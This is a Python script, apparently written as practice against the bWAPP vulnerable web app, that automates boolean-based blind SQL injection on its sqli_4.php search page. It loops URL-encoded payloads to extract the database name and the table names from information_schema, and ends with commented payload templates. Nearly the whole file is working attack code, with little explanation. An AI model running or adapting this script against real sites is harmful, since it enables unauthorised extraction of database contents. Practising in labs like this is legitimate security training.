import requests
import string

cookies = {"PHPSESSID":"q4qvd15jqqbdi85fn80s7favq2", "security_level":"0"}
url = "http://192.168.0.60/sqli_4.php?title="
word_list = string.printable
database = ""
table_name = ""

# find database length
for database_length in range(0,20):
    payload = f"{url}%27+or+if%28%28length%28%28select+database%28%29%29%29%3D{database_length}%29%2C1%2C0%29%23&action=search"
    response = requests.get(payload, cookies=cookies)
    if (response.text.find("The movie exists in our database!") > -1 ):
            print("database length:",database_length)
            break


# find database name
for j in range(1,database_length+1):
    for word in word_list:
        payload = f"{url}%27+or+if%28%28substring%28%28select+BINARY+database%28%29%29%2C{j}%2C1%29%3D\"{word}\"%29%2C1%2C0%29%23&action=search"
        #print("URL: ",url)
        response = requests.get(payload, cookies=cookies)
        #print(response.text)
        if (response.text.find("The movie exists in our database!") > -1 ):
            #print("find",j,"th value:",word)
            database = database + word
print("database name:",database)

# find tables count
#3중 for문을 써야할듯?
for table_count in range(0,10):
    payload = f"{url}%27+or+if%28%28select+count%28*%29+from+information_schema.tables+where+table_schema%3D%27bWAPP%27%29%3D{table_count}%2C1%2C0%29%23&action=search"
    response = requests.get(payload, cookies=cookies)
    if (response.text.find("The movie exists in our database!") > -1 ):
        print("table count:",table_count)
        break

#find table length
for j in range(0,table_count):
    for table_len in range(0,20):
        payload = f"{url}%27+or+if%28%28length%28%28select+table_name+from+information_schema.tables+where+table_schema%3D%27{database}%27+limit+{j}%2C1%29%29%3D{table_len}%29%2C1%2C0%29%23&action=search"
        response = requests.get(payload, cookies=cookies)
        if (response.text.find("The movie exists in our database!") > -1 ):
            print("table length:",table_len)
            for k in range(0,table_len+1):
                for word in word_list:
                    payload = f"{url}%27+or+if%28%28substring%28%28select+BINARY+table_name+from+information_schema.tables+where+table_schema%3D%27bWAPP%27+limit+{j}%2C1%29%2C{k}%2C1%29%3D%27{word}%27%29%2C1%2C0%29%23&action=search"
                    response = requests.get(payload, cookies=cookies)
                    #print(payload)
                    if (response.text.find("The movie exists in our database!") > -1 ):
                        #print("find",j,"table",k,"th value:",word)
                        table_name = table_name + word
                print("table name:",table_name)
            table_name=""
                    
            break
#' or if((length((select database()))=5),1,0)#
#' or if((substring((select database()),{num},1)='{char}'),1,0)#
# 길이를 구하는 페이로드
#' or if((length((select table_name from information_schema.tables where table_schema='bWAPP' limit 0,1))=5),1,0)#
# 테이블 개수를 구하는 페이로드
#' or if((select count(*) from information_schema.tables where table_schema='bWAPP')=5,1,0)#
# 테이블명을 구하는 페이로드
#' or if((substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 0,1),1,1)='b'),1,0)#
#%27+or+if%28%28substring%28%28select+table_name+from+information_schema.tables+where+table_schema%3D%27bWAPP%27+limit+{j}%2C1%29%2C{i}%2C1%29%3D%27{char}%27%29%2C1%2C0%29%23&action=search 
#' or if((substring((select table_name from information_schema.tables where table_schema='bWAPP' limit {j},1),{i},1)='{char}'),1,0)#

 